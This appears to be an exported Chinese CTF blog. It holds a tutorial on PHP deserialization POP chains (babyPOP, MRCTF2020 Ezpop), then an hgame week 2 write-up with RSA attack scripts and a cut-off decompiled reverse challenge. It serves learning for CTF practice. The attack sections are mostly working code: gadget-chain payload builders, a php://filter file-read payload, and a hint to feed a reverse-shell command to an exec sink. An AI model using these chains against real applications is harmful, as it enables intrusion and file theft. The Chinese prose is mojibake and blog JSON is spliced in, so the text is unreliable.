åœ¨åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´æ—¶ï¼Œæ¼æ´çš„åˆ©ç”¨ç‚¹æœ‰æ—¶å€™å¹¶ä¸ä¼šåœ¨é­”æœ¯æ–¹æ³•ä¸­ï¼Œè€Œæ˜¯å­˜åœ¨äºæ™®é€šæ–¹æ³•ä¸­ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å°±è¦æ„å»ºpopæ¥é€æ­¥è·Ÿè¿›è°ƒç”¨å‡½æ•°ï¼Œç›´åˆ°æ‰¾åˆ°åˆ©ç”¨ç‚¹ã€‚ ä¾‹é¢˜ç†è§£ã€æå®¢å¤§æŒ‘æˆ˜2021ã€‘babyPOPå›é¡¾ä¸€ä¸‹å»å¹´æå®¢å¤§æŒ‘æˆ˜è¿™é“POPé¢˜ï¼Œå…ˆçœ‹ä»£ç ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpclass a &#123; public static $Do_u_like_JiaRan = false; public static $Do_u_like_AFKL = false;&#125;class b &#123; private $i_want_2_listen_2_MaoZhongDu; public function __construct() &#123; $this-&gt;i_want_2_listen_2_MaoZhongDu; &#125; public function __toString() &#123; if (a::$Do_u_like_AFKL) &#123; return exec($this-&gt;i_want_2_listen_2_MaoZhongDu); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125;class c &#123; public $b; public function __wakeup() &#123; a::$Do_u_like_JiaRan = true; &#125;&#125;class d &#123; public $value; public function __invoke() &#123; a::$Do_u_like_AFKL = true; return &quot;å…³æ³¨å˜‰ç„¶,&quot; . $this-&gt;value; &#125;&#125;class e &#123; public $afkl; public function __destruct() &#123; if (a::$Do_u_like_JiaRan) &#123; ($this-&gt;afkl)(); &#125; else &#123; throw new Error(&quot;Noooooooooooooooooooooooooooo!!!!!!!!!!!!!!!!&quot;); &#125; &#125;&#125; å®¡è®¡ä»£ç ï¼Œç±»aä¸­å®šä¹‰äº†ä¸¤ä¸ªé™æ€å˜é‡ï¼Œå‡ä¸ºflaseï¼Œæ¥ç€çœ‹åˆ©ç”¨ç‚¹åœ¨ç±»bçš„execå‡½æ•°ä¸­ï¼Œè€Œè¦åˆ©ç”¨è¿™ä¸ªå‡½æ•°éœ€è¦æ»¡è¶³$Do_u_like_AFKLä¸ºtrueï¼Œå› æ­¤å®šä½åˆ°ç±»dï¼Œè€Œ__invokeæ–¹æ³•éœ€è¦ä½¿ç”¨è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ï¼Œå› æ­¤å®šä½åˆ°ç±»eï¼Œå‘ç°éœ€è¦$Do_u_like_JiaRanä¸ºtrueæ‰å¯ä»¥ï¼Œæœ€åå®šä½åˆ°ç±»cã€‚ ç†æ¸…é€»è¾‘åï¼Œæˆ‘ä»¬å‘ç°cä¸eä¹‹é—´æ²¡æœ‰ç›´æ¥çš„æ¡¥æ¢ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦è‡ªå®šä¹‰å˜é‡è¿æ¥ä¸¤è€…ï¼Œæ„å»ºpayloadï¼š 123456789$c=new c();$e=new e();$d=new d();$b=new b();$b-&gt;i_want_2_listen_2_MaoZhongDu=&quot;xxxxxxx&quot;;$d-&gt;value=$b;$e-&gt;afkl=$d;$c-&gt;b=$e;echo base64_encode(serialize($c)); è¿™é¢˜åˆ©ç”¨åå¼¹shellåŸç†å¯¹bèµ‹å€¼å³å¯ã€‚ [MRCTF2020]Ezpopè¿™æ˜¯ä¸€é“æ¯”è¾ƒç»å…¸çš„popé“¾çš„é¢˜ç›®ï¼Œå¾ˆé€‚åˆåšå‚è€ƒã€‚ æºä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253 &lt;?php//flag is in flag.php//WTF IS THIS?//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95//And Crack It!class Modifier &#123; protected $var; public function append($value)&#123; include($value); &#125; public function __invoke()&#123; $this-&gt;append($this-&gt;var); &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; $function = $this-&gt;p; return $function(); &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]);&#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; åŒæ ·å®¡è®¡ä»£ç è¿›è¡Œåˆ†æï¼Œé¦–å…ˆæ‰¾åˆ°åˆ©ç”¨ç‚¹ï¼Œå‘ç°ç±»Modifierä¸­å­˜åœ¨includeå‡½æ•°ï¼Œç¡®è®¤è¿™é‡Œä¸ºåˆ©ç”¨ç‚¹ã€‚æ¥ç€å‘ç°æˆ‘ä»¬æƒ³è¦æ‰§è¡Œè¿™ä¸ªåˆ©ç”¨ç‚¹ï¼Œå°±éœ€è¦è°ƒç”¨appendè¿™ä¸ªæ–¹æ³•ï¼Œè€Œè¦è°ƒç”¨è¿™ä¸ªæ–¹æ³•å°±éœ€è¦è§¦å‘__invokeæ–¹æ³•ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¼ å…¥varçš„å€¼ã€‚ è€Œè¦è§¦å‘__invokeæ–¹æ³•ï¼Œåˆ™éœ€è¦ç±»Testä¸­çš„å±æ€§$pï¼Œä½†æ˜¯è¦è°ƒç”¨__getæ–¹æ³•æ‰å¯ä»¥ï¼Œè€Œè°ƒç”¨__getæ–¹æ³•åˆ™éœ€è¦ç»™åœ¨ç±»Showä¸­çš„strèµ‹å€¼ç±»Testçš„å¯¹è±¡ï¼Œç”±äºç±»Testä¸­æ²¡æœ‰å±æ€§$sourceæ‰€ä»¥å¯ä»¥è°ƒç”¨ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦è°ƒç”¨__toStringæ–¹æ³•ï¼Œè€Œè¦è°ƒç”¨è¿™ä¸ªæ–¹æ³•éœ€è¦ç±»Showçš„å¯¹è±¡è¢«å½“æˆå­—ç¬¦ä¸²æ“ä½œï¼Œå› æ­¤è¦åˆ©ç”¨__wakeupæ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ä¸­$sourceå±æ€§è¢«å½“æˆå­—ç¬¦ä¸²å»æ¯”è¾ƒã€‚ é€»è¾‘æ•´ç†å®Œï¼Œæ„å»ºpayloadï¼š 12345678910111213141516171819202122232425&lt;?phpclass Modifier &#123; protected $var=&quot;php://filter/convert.base64-encode/resource=flag.php&quot;;&#125;class Show&#123; public $source; public $str; public function __construct($file)&#123; $this-&gt;source = $file; &#125; public function __toString()&#123; return &quot;&quot;; &#125;&#125;class Test&#123; public $p;&#125;$a = new Show(&#x27;a&#x27;);$a -&gt; str = new Test();$a -&gt; str -&gt; p = new Modifier();$b = new Show($a);echo urlencode(serialize($b)); æœ€åä¼ å‚å³å¯å¾—åˆ°flagã€‚ é­”æœ¯æ–¹æ³•æ€»ç»“é­”æœ¯æ–¹æ³•è¿™å—åœ¨ä¹‹å‰çš„åšå®¢ä¹Ÿç®€å•æåˆ°äº†ï¼Œç”±äºpopé“¾çš„æ„é€ æ•´ä¸ªæœºåˆ¶å¯¹é­”æœ¯æ–¹æ³•çš„è¿ç”¨è¿˜æ˜¯æœ‰ä¸€å®šè¦æ±‚çš„ï¼Œè¿™é‡Œå°±å†å¤ä¹ ä¸‹ï¼š __construct()ï¼Œç±»çš„æ„é€ å‡½æ•° __destruct()ï¼Œç±»çš„ææ„å‡½æ•° __call()ï¼Œåœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ __callStatic()ï¼Œç”¨é™æ€æ–¹å¼ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•æ—¶è°ƒç”¨ __get()ï¼Œè·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ __set()ï¼Œè®¾ç½®ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨ __isset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨isset()æˆ–empty()æ—¶è°ƒç”¨ __unset()ï¼Œå½“å¯¹ä¸å¯è®¿é—®å±æ€§è°ƒç”¨unset()æ—¶è¢«è°ƒç”¨ã€‚ __sleep()ï¼Œæ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•° __wakeup()ï¼Œæ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•° __toString()ï¼Œç±»è¢«å½“æˆå­—ç¬¦ä¸²æ—¶çš„å›åº”æ–¹æ³• __invoke()ï¼Œè°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³• __set_state()ï¼Œè°ƒç”¨var_export()å¯¼å‡ºç±»æ—¶ï¼Œæ­¤é™æ€æ–¹æ³•ä¼šè¢«è°ƒç”¨ã€‚ __clone()ï¼Œå½“å¯¹è±¡å¤åˆ¶å®Œæˆæ—¶è°ƒç”¨ __autoload()ï¼Œå°è¯•åŠ è½½æœªå®šä¹‰çš„ç±» __debugInfo()ï¼Œæ‰“å°æ‰€éœ€è°ƒè¯•ä¿¡æ¯ å…·ä½“åˆ†æå‚è€ƒä¸‹é¢è¿™å‡ ç¯‡åšå®¢ï¼šPHPä¹‹åå…­ä¸ªé­”æœ¯æ–¹æ³•è¯¦è§£PHPååºåˆ—åŒ–å’Œé­”æœ¯æ–¹æ³• æ€»ç»“popé“¾çš„æ„å»ºè¿˜æ˜¯å…·æœ‰ä¸€å®šéš¾åº¦çš„ï¼Œå¯¹é“¾æ¡çš„é€»è¾‘éœ€è¦æœ‰å‡†ç¡®çš„åˆ¤æ–­ï¼Œè¿˜æ˜¯éœ€è¦åšä¸€äº›ç»ƒä¹ æ¥å·©å›ºçš„ã€‚è¿˜å‰©åŸç”Ÿæ–¹æ³•é‚£ä¸€å—æ²¡çœ‹ï¼Œä¹‹åæ‰¾ä¸ªæ—¶é—´ç¨å¾®å­¦ä¸‹ã€‚","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -php","slug":"web-php","permalink":"http://example.com/tags/web-php/"}]},{"title":"ã€hgame week2ã€‘write up","slug":"ã€hgame-week2ã€‘write-up","date":"2022-02-04T12:12:48.000Z","updated":"2022-02-05T11:22:48.669Z","comments":true,"path":"2022/02/04/ã€hgame-week2ã€‘write-up/","link":"","permalink":"http://example.com/2022/02/04/%E3%80%90hgame-week2%E3%80%91write-up/","excerpt":"å‰è¨€ç¬¬äºŒå‘¨æœç„¶éº»ä¸­éº»ï¼Œå¯†ç å’ŒxssæŠŠæˆ‘æŠ˜ç£¨äº†ï¼Œè¿™é‡Œç›´æ¥é¢„å‘Šä¸‹å‘¨æ‘†çƒ‚ã€‚","text":"å‰è¨€ç¬¬äºŒå‘¨æœç„¶éº»ä¸­éº»ï¼Œå¯†ç å’ŒxssæŠŠæˆ‘æŠ˜ç£¨äº†ï¼Œè¿™é‡Œç›´æ¥é¢„å‘Šä¸‹å‘¨æ‘†çƒ‚ã€‚ CRYPTORSA Attackè¿™é¢˜çš„RSAæ¯”è¾ƒç®€å•ï¼Œnå¯ä»¥ç›´æ¥åœ¨çº¿åˆ†è§£ï¼ŒæŠŠnåˆ†è§£åç›´æ¥è·‘è„šæœ¬å°±å¯ä»¥äº†ã€‚ è„šæœ¬ï¼š 123456789101112import libnumflag = &#x27;&#x27;p = 715800347513314032483037q = 978782023871716954857211e = 65537c = 122622425510870177715177368049049966519567512708n = p*qphi = (p-1)*(q-1)d = libnum.invmod(e,phi)flag = libnum.n2s(pow(c,d,n))print(flag) Chinese Character Encryptionè¿™é¢˜çœŸçš„éº»ä¸­éº»ï¼Œåšçš„æ—¶å€™å¿ƒæ€éƒ½å´©äº†ã€‚æ ¹æ®æç¤ºï¼ŒåŠ å¯†æ–¹å¼åªä¸æ‹¼éŸ³æœ‰å…³ï¼Œå¹¶ä¸”å£°è°ƒå•ç‹¬åŠ å¯†ã€‚è¿™é‡Œæˆ‘åˆ†æäº†åŠå¤©ç»ˆäºåˆ†æå‡ºæ¥åŠ å¯†é€»è¾‘äº†ï¼š é¦–å…ˆå°†æ‹¼éŸ³çš„æ‰€æœ‰å­—æ¯å¯¹åº”çš„æ•°å­—ç›¸åŠ ï¼Œæ¯”å¦‚chaoå°±æ˜¯3+8+1+15=27ï¼›æ¥ç€å†çœ‹æœ‰å‡ ä¸ªå­—æ¯ï¼Œå¦‚æœæ˜¯ä¸¤ä¸ªå°±+64ï¼Œä¸‰ä¸ª+32ï¼Œå››ä¸ªä¸å˜ï¼Œäº”ä¸ª-32ï¼Œå…­ä¸ª-64ï¼›å†ç„¶åçœ‹å£°è°ƒï¼Œä¸€å£°+49ï¼ŒäºŒå£°+50ï¼Œä¸‰å£°+51ï¼Œå››å£°+52åœºï¼Œè½»å£°ä¸å˜ã€‚æœ€åå¾—å‡ºæ¥çš„è¿™ä¸ªå€¼å³ä¸ºå­—ç¬¦ä¸²çš„asciiç å€¼ã€‚ æ ¹æ®ä¸Šè¿°é€»è¾‘ï¼Œç¼–å†™è„šæœ¬ï¼ˆå®åŠ›ä¸è¡Œåªèƒ½å†™å‡ºè¿™ç§çƒ‚è„šæœ¬äº†ï¼‰ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pypinyin import lazy_pinyin,Stylefrom libnum import n2s,s2nstyle = Style.TONE3a = lazy_pinyin(&#x27;é™‰èä¿¦è˜­è²‘è¬ ç¥¥å†„å‰é«¯ç°§å‡°è•†ç§‰åƒ¦ç¬†é¼£é›”è€¿çºæ¸ºä»¦æ®£æ«¤é„½åŸå£®è¤ƒåŠ³å……è¿§è”é•æ¨·è¾æ‡´é›ˆè¸ºçŒ³é’”ç·²è©è’é†¢å¾£çº’æ¼&#x27;,style=style)print(a)flag = &#x27;&#x27;str = 0for i in range(0,47): b = list(a[i]) for j in range(0,10): c = len(b) if(j&lt;c-1): str += s2n(b[j]) - 96 else: if(b[j]==&#x27;1&#x27;): if(j==2): str += 64 if(j==3): str += 32 if(j==5): str -= 32 if(j==6): str -= 64 str += 49 flag += chr(str) str=0 break elif(b[j]==&#x27;2&#x27;): if(j==2): str += 64 if(j==3): str += 32 if(j==5): str -= 32 if(j==6): str -= 64 str += 50 flag += chr(str) str=0 break elif(b[j]==&#x27;3&#x27;): if(j==2): str += 64 if(j==3): str += 32 if(j==5): str -= 32 if(j==6): str -= 64 str += 51 flag += chr(str) str=0 break elif(b[j]==&#x27;4&#x27;): if(j==2): str += 64 if(j==3): str += 32 if(j==5): str -= 32 if(j==6): str -= 64 str += 52 flag += chr(str) str=0 break else: if(j==2): str += 64 if(j==3): str += 32 if(j==5): str -= 32 if(j==6): str -= 64 str += s2n(b[j]) flag += chr(str) str=0 breakprint(flag) å¾—åˆ°flagï¼š RSA Attack 2RSAå¤šç§è€ƒæ³•çš„æ‚ç³…ï¼Œä¸€å…±ä¸‰éƒ¨åˆ†ï¼Œå…ˆçœ‹æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import refrom math import ceilfrom Crypto.Util.number import getPrimefrom libnum import s2nfrom secret import flagflag_parts = list(map(s2n, re.findall(rf&quot;.&#123;&#123;,&#123;ceil(len(flag) / 3)&#125;&#125;&#125;&quot;, flag)))print(&quot;# task1&quot;)m = flag_parts[0]e = 65537p = getPrime(1024)q = getPrime(1024)r = getPrime(1024)n1 = p * qc1 = pow(m, e, n1)n2 = r * qc2 = pow(m, e, n2)print(&quot;e =&quot;, e)print(&quot;n1 =&quot;, n1)print(&quot;c1 =&quot;, c1)print(&quot;n2 =&quot;, n2)print(&quot;c2 =&quot;, c2)print(&quot;# task2&quot;)m = flag_parts[1]e = 7p = getPrime(1024)q = getPrime(1024)n = p * qc = pow(m, e, n)print(&quot;e =&quot;, e)print(&quot;n =&quot;, n)print(&quot;c =&quot;, c)print(&quot;# task3&quot;)m = flag_parts[2]p = getPrime(1024)q = getPrime(1024)n = p * qe1 = getPrime(32)e2 = getPrime(32)c1 = pow(m, e1, n)c2 = pow(m, e2, n)print(&quot;n =&quot;, n)print(&quot;e1 =&quot;, e1)print(&quot;c1 =&quot;, c1)print(&quot;e2 =&quot;, e2)print(&quot;c2 =&quot;, c2) é¦–å…ˆæ˜¯ç¬¬ä¸€éƒ¨åˆ†ï¼Œå¯ä»¥å‘ç°n1ã€n2æœ‰å…±åŒçš„è´¨æ•°qï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹è®¡ç®—å‡ºdï¼Œç¼–å†™è„šæœ¬ï¼š 1234567891011121314151617import libnumn1 = 14611545605107950827581005165327694782823188603151768169731431418361306231114985037775917461433925308054396970809690804073985835376464629860609710292181368600618626590498491850404503443414241455487304448344892337877422465715709154238653505141605904184985311873763495761345722155289457889686019746663293720106874227323699288277794292208957172446523420596391114891559537811029473150123641624108103676516754449492805126642552751278309634846777636042114135990516245907517377320190091400729277307636724890592155256437996566160995456743018225013851937593886086129131351582958811003596445806061492952513851932238563627194553n2 = 20937478725109983803079185450449616567464596961348727453817249035110047585580142823551289577145958127121586792878509386085178452171112455890429474457797219202827030884262273061334752493496797935346631509806685589179618367453992749753318273834113016237120686880514110415113673431170488958730203963489455418967544128619234394915820392908422974075932751838012185542968842691824203206517795693893863945100661940988455695923511777306566419373394091907349431686646485516325575494902682337518438042711296437513221448397034813099279203955535025939120139680604495486980765910892438284945450733375156933863150808369796830892363e1 = 65537c1 = 965075803554932988664271816439183802328812013694203741320763105376036912584995031647672348468111310423680858101990670067065306237596121664884353679987689532305437801346923070145524106271337770666947677115752724993307387122132705797012726237073550669419110046308257408484535063515678066777681017211510981429273346928022971149411064556225001287399141306136081722471075032423079692908380267160214143720516748000734987068685104675254411687005690312116824966036851568223828884335112144637268090397158532937141122654075952730052331573980701136378212002956719295192733955673315234274064519957670199895100508623561838510479c2 = 11536506945313747180442473461658912307154460869003392732178457643224057969838224601059836860883718459986003106970375778443725748607085620938787714081321315817144414115589952237492448483438910378865359239575169326116668030463275817609827626048962304593324479546453471881099976644410889657248346038986836461779780183411686260756776711720577053319504691373550107525296560936467435283812493396486678178020292433365898032597027338876045182743492831814175673834198345337514065596396477709839868387265840430322983945906464646824470437783271607499089791869398590557314713094674208261761299894705772513440948139429011425948090p1 = libnum.gcd(n1,n2)q1 = n1//p1phi1 = (p1-1)*(q1-1)d1 = libnum.invmod(e1,phi1)flag = libnum.n2s(pow(c1,d1,n1))print(flag) å¾—åˆ°ç¬¬ä¸€éƒ¨åˆ†flagï¼š æ¥ç€ç¬¬äºŒéƒ¨åˆ†ï¼Œå¯ä»¥å‘ç°eå€¼éå¸¸å°ï¼Œå› æ­¤å¯ä»¥ç›´æ¥çˆ†ç ´å‡ºæ¥ï¼Œæ‡’å¾—å†™è„šæœ¬å°±æ‹¿äº†ä»½ç½‘ä¸Špython2çš„æ¥ç”¨ï¼š 12345678910# -*- coding: cp936 -*-import gmpy2e = 7# è¯»å…¥ n, å¯†æ–‡n= 14157878492255346300993349653813018105991884577529909522555551468374307942096214964604172734381913051273745228293930832314483466922529240958994897697475939867025561348042725919663546949015024693952641936481841552751484604123097148071800416608762258562797116583678332832015617217745966495992049762530373531163821979627361200921544223578170718741348242012164115593777700903954409103110092921578821048933346893212805071682235575813724113978341592885957767377587492202740185970828629767501662195356276862585025913615910839679860669917255271734413865211340126544199760628445054131661484184876679626946360753009512634349537c= 10262871020519116406312674685238364023536657841034751572844570983750295909492149101500869806418603732181350082576447594766587572350246675445508931577670158295558641219582729345581697448231116318080456112516700717984731655900726388185866905989088504004805024490513718243036445638662260558477697146032055765285263446084259814560197549018044099935158351931885157616527235283229066145390964094929007056946332051364474528453970904251050605631514869007890625result = gmpy2.iroot(c, 7)if result[1]: print &#x27;&#123;:x&#125;&#x27;.format(result[0]).decode(&#x27;hex&#x27;) è·‘å‡ºç¬¬äºŒéƒ¨åˆ†flagï¼š æ¥ç€çœ‹ç¬¬ä¸‰éƒ¨åˆ†ï¼Œçº¯çº¯çš„å…±æ¨¡åŠ å¯†ï¼ŒåŒæ ·ä»ç½‘ä¸Šæ‰’æ¥python2è„šæœ¬ï¼š 123456789101112131415161718192021222324252627282930# -*- coding: cp936 -*-import gmpy2n = 18819509188106230363444813350468162056164434642729404632983082518225388069544777374544142317612858448345344137372222988033366528086236635213756227816610865045924357232188768913642158448603346330462535696121739622702200540344105464126695432011739181531217582949804939555720700457350512898322376591813135311921904580338340203569582681889243452495363849558955947124975293736509426400460083981078846138740050634906824438689712748324336878791622676974341814691041262280604277357889892211717124319329666052810029131172229930723477981468761369516771720250571713027972064974999802168017946274736383148001865929719248159075729e = [2519901323, 3676335737]c = [3230779726225544872531441169009307072073754578761888387983403206364548451496736513905460381907928107310030086346589351105809028599650303539607581407627819797944337398601400510560992462455048451326593993595089800150342999021874734748066692962362650540036002073748766509347649818139304363914083879918929873577706323599628031618641793074018304521243460487551364823299685052518852685706687800209505277426869140051056996242882132616256695188870782634310362973153766698286258946896866396670872451803114280846709572779780558482223393759475999103607704510618332253710503857561025613632592682931552228150171423846203875344870, 940818595622279161439836719641707846790294650888799822335007385854166736459283129434769062995122371073636785371800857633841379139761091890426137981113087519934854663776695944489430385663011713917022574342380155718317794204988626116362865144125136624722782309455452257758808172415884403909840651554485364309237853885251876941477098008690389600544398998669635962495989736021020715396415375890720335697504837045188626103142204474942751410819466379437091569610294575687793060945525108986660851277475079994466474859114092643797418927645726430175928247476884879817034346652560116597965191204061051401916282814886688467861]c1 = c[0]c2 = c[1]e1 = e[0]e2 = e[1]s = gmpy2.gcdext(e1, e2)s1 = s[1]s2 = s[2]if s1 &lt; 0: s1 = -s1 c1 = gmpy2.invert(c1, n)elif s2 &lt; 0: s2 = -s2 c2 = gmpy2.invert(c2, n)m = pow(c1, s1, n) * pow(c2, s2, n) % nprint &#x27;&#123;:x&#125;&#x27;.format(int(m)).decode(&#x27;hex&#x27;) è·‘å‡ºç¬¬ä¸‰éƒ¨åˆ†flagï¼š æœ€åç»„åˆflagï¼šhgame{RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW} MISCå¥‡å¦™å°æ¸¸æˆåŒæ ·å¾ˆéº»çš„ä¸€é¢˜ï¼Œä¸è¿‡è¿™é¢˜è„‘æ´æ²¡å‰é¢å¯†ç é‚£é¢˜å¤§ï¼Œä¸€ä¸‹åˆä¸åˆ°è¿˜æ˜¯åšå‡ºæ¥äº†ã€‚ncè¿æ¥åæ˜¯ä¸€ä¸ªè¿·å®«å›¾ï¼Œè¿˜ç»™äº†ä¸€ä¸ªentryå€¼ï¼Œé€šè¿‡å¤šæ¬¡åšé”™åˆ†æç­”æ¡ˆå¾—å‡ºè§£æ³•ï¼š å¦‚å›¾æ‰€ç¤ºåˆ†åˆ—ï¼Œentryå³ä¸ºèµ·ç‚¹åˆ—ï¼Œä»ä¸‹å¾€ä¸Šè¡Œè¿›ï¼Œå¦‚æœç¢°åˆ°æ¨ªè¿‡æ¥çš„éƒ¨åˆ†å°±è¦é€šè¿‡é‚£ä¸ªéƒ¨åˆ†å‰å¾€å¦ä¸€åˆ—ï¼Œç„¶åç»§ç»­ä¸Šè¡Œï¼Œä»¥æ­¤è§„åˆ™æœ€åæŠµè¾¾å“ªä¸€åˆ—çš„æœ€ä¸Šé¢ç­”æ¡ˆå°±æ˜¯é‚£ä¸ªæ•°å­—ã€‚ å¾—å‡ºè§£æ³•åä¸€ç›´è¿‡å…³å°±å¯ä»¥äº†ï¼Œä¸è¿‡å®¹å™¨ç»™çš„æ—¶é—´æ˜¯çœŸçš„çŸ­ï¼š ä¸€å¼ æ€ªæ€ªçš„åç‰‡ç¤¾å·¥é¢˜ï¼Œé¦–å…ˆç»™äº†ä¸ªäºŒç»´ç ï¼Œæ‹¼æ¥ç©å‘ç°æ‰«ä¸å‡ºæ¥ï¼Œç”¨qrazyboxè¿›è¡Œè¯†åˆ«ï¼š æ¥ç€ä½¿ç”¨å…¶ä¸­çš„å…³é”®å­—homeboycï¼Œè°·æ­Œæˆ–è€…å¿…åº”ç­‰æœç´¢ï¼Œæ‰¾åˆ°åšå®¢ï¼š æ¥ç€ç¿»é˜…åšå®¢ï¼Œå‘ç°å‹é“¾éƒ¨åˆ†æœ‰ä¸€ä¸ªè‡ªç•™åœ°ï¼š ç‚¹å‡»è¿›å»å‘ç°3ç¯‡åšå®¢ï¼Œä¸€ç¯‡æ˜¯å»å¹´8æœˆ16æ—¥å‘å¸ƒçš„é¸¿å¸ˆå‚…åº†ç¥å¥³å‹19å²ç”Ÿæ—¥ï¼Œä¸€ç¯‡æç¤ºæœ‰ä¸€ä¸ªå¼±å¯†ç å¹¶ä¸”å«æœ‰ä¸€ä¸ªä¿¡æ¯ï¼Œè¿˜æœ‰ä¸€ç¯‡åšå®¢ç›´æŒ‡flagï¼š æ ¹æ®åšå®¢å†…å®¹ï¼Œéœ€è¦çŒœæµ‹å¼±å¯†ç å¹¶ä¸”è¿›è¡ŒPBKDF2å°†å¯†ç è½¬åŒ–ä¸ºkeyï¼ŒçŒœäº†åŠå¤©æ‰çŒœå‡ºæ¥å¯†ç æ˜¯hgame20020816ï¼Œæ¥ç€è§£å¯†å°±å¯ä»¥äº†ï¼š ä½ ä¸Šå½“äº† æˆ‘çš„å¾ˆå¤§é™„ä»¶ç»™äº†ä¸€ä¸ª3ç‚¹å¤šGçš„å‹ç¼©åŒ…ï¼Œé‡Œé¢æ˜¯å‹ç¼©åŒ…å¥—å¨ƒï¼Œåº”è¯¥å¥—å¨ƒå‡ºæ¥æ˜¯å››ä¸ªäºŒç»´ç çš„ï¼Œä½†æ˜¯å‡ºé¢˜äººå¤±è¯¯æ”¾é‡å¤äº†ï¼Œæ‰€ä»¥é‡Œé¢åªæœ‰ä¸¤ä¸ªä¸åŒçš„äºŒç»´ç ï¼š åé¢åˆæ”¾äº†å‰©ä¸‹çš„ä¸¤ä¸ªäºŒç»´ç ï¼š è¿™å››ä¸ªäºŒç»´ç ä¾æ¬¡ä¸ºData Matrixã€codablock Fã€Aztecã€PDF147ç ï¼Œä¾æ¬¡æ‰«ç å¾—åˆ°å››ä¸ªbase64ç ï¼Œå››ä¸ªbase64ç è½¬æ¢æˆå››å¼ å›¾ç‰‡ï¼Œå››å¼ å›¾ç‰‡ç»„åˆæˆä¸€ä¸ªQRç ï¼Œæ‰«æå³å¯å¾—åˆ°flagï¼š æˆªå›¾çš„æ—¶å€™è¦å°½é‡æˆªåˆšå¥½ï¼Œå¦åˆ™äºŒç»´ç å¯èƒ½ä¼šè¯†åˆ«å¤±è´¥ã€‚ REVERSExD MAZEç›´æ¥æ”¾ä¼ªä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586signed __int64 __fastcall sub_4015EC(__int64 a1, __int64 a2)&#123; __int64 v2; // rdx int v3; // ebx __int64 v4; // rdx unsigned int v5; // eax __int64 v6; // rsi __int64 v7; // rdx __int64 v8; // rax signed __int64 result; // rax bool v10; // al __int64 v11; // rax __int64 v12; // rax __int64 v13; // rax __int64 v14; // rax __int64 v15; // [rsp+20h] [rbp-30h] __int64 v16; // [rsp+28h] [rbp-28h] __int64 v17; // [rsp+30h] [rbp-20h] __int64 v18; // [rsp+38h] [rbp-18h] int v19; // [rsp+40h] [rbp-10h] int i; // [rsp+48h] [rbp-8h] int v21; // [rsp+4Ch] [rbp-4h] sub_401980(a1, (__int64 *)a2); v15 = 0LL; v16 = 0LL; v17 = 0LL; v18 = 0LL; v19 = 0; v21 = 0; ZStrsIcSt11char_traitsIcEERSt13basic_istreamIT_T0_ES6_PS3_(a1, a2, (__int64)&amp;v15, (__int64)&amp;ZSt3cin); v3 = sub_401550(a1, a2, v2, &amp;v15); v5 = sub_401550(a1, a2, v4, &quot;hgame&#123;&quot;); v6 = v5; if ( v3 != v5 + (unsigned int)sub_401550(a1, v5, v7, &quot;&#125;&quot;) + 28 ) &#123; v8 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;length err&quot;, &amp;ZSt4cout); ZNSolsEPFRSoS_E(a1, v6, ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_, v8); result = 1LL; &#125; else &#123; v10 = (unsigned int)sub_40158F(a1, v6, (__int64)&quot;hgame&#123;&quot;, (__int64)&amp;v15, 6) || BYTE2(v19) != 125; if ( v10 ) &#123; v11 = ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(a1, v6, &quot;Forbidden format&quot;, &amp;ZSt4cout); ZNSolsEPFRSoS_E(a1, v6, 